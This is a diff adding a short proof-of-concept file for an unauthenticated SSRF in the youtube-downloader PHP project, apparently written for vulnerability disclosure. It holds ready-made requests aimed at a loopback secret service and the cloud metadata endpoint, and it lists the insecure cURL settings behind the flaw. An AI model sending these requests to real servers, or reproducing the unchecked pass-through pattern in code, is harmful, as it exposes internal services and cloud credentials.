@@ -1,0 +1,27 @@
+# athlon1600/youtube-downloader — Unauthenticated SSRF (CWE-918)
+# Target: GET /public/stream.php?url=<attacker-url>
+# No authentication, session, or token required.
+
+## 1. Read an internal-only service (loopback)
+
+# Internal service (simulated) on 127.0.0.1:8899 serves:
+#   GET /internal-secret -> {"secret":"INTERNAL_DB_PASSWORD_7f8c3","service":"internal-admin"}
+
+GET /public/stream.php?url=http%3A%2F%2F127.0.0.1%3A8899%2Finternal-secret HTTP/1.1
+Host: <VICTIM>
+
+## 2. Reach private-network / cloud-metadata hosts
+
+# Cloud metadata example (sensitive on cloud deployments):
+GET /public/stream.php?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F HTTP/1.1
+Host: <VICTIM>
+
+## 3. cURL options used upstream (src/YouTubeStreamer.php:stream())
+
+#   CURLOPT_URL                 = $_GET['url']              (verbatim, L89)
+#   CURLOPT_FOLLOWLOCATION      = true                      (up to 5 redirects, L96-97)
+#   CURLOPT_SSL_VERIFYPEER      = false                     (L86)
+#   CURLOPT_SSL_VERIFYHOST      = 0                         (L85)
+#   CURLOPT_WRITEFUNCTION       -> bodyCallback: echo $data (L106)
+#   CURLOPT_HEADERFUNCTION      -> forwards content-type/content-length/content-range
+#   CURLOPT_PROTOCOLS           -> HTTP/HTTPS only
